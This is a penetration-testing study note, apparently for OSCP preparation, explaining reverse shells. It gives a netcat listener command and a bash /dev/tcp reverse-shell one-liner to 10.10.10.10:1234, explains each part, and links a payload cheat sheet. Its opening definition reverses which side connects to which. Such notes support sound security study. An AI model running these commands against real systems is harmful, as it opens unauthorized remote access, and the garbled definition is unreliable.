---
title: technique-note
type: note
permalink: oscp/templates/technique-note
---

---
title: Reverse Shell
category: other
created: 2026-08-11
tags: [technique, other]
---

# Reverse Shell

## What it is
- Most common type of shell that has the attacker connect to us so we can run commands on their machine
- Use `netcat` listener on our machine to run commands which is used for the target to connect to us

## When to use it
- When a identify that we can do remote code execution on the target

## Commands
#### Starting a listener using netcat
```bash
nc -lvnp 1234
```
- `-l` listen mode
- `-v` verbose mode
- `-n` Disable dns resolution to it connects from ip to speed up connection
- `-p` used to specify the port to which the target listens to, in this case `1234`

#### Linux Reverse Shells
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
- `bash -c '...'` run commands inside the quotes
- `bash -i` start interactive shell 
- `>&` takes the output and errors, bundles them together to whatever comes next, `>` for redirecting, and `&` for bundling
- `/dev/tcp/10.10.10.10/1234` destination for the redirection, treated as a network connection to 10.10.10.10 on port 1234
- `0>&1` redirect inputs and output to our network connection on `10.10.10.10:1234`
## Things to know
- Command executed depend on the OS of the target
- [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a reverse shell cheat sheet

## Boxes where I used this
- [[]]

## Gotchas / troubleshooting
- Things that broke and how you fixed them:

## References
-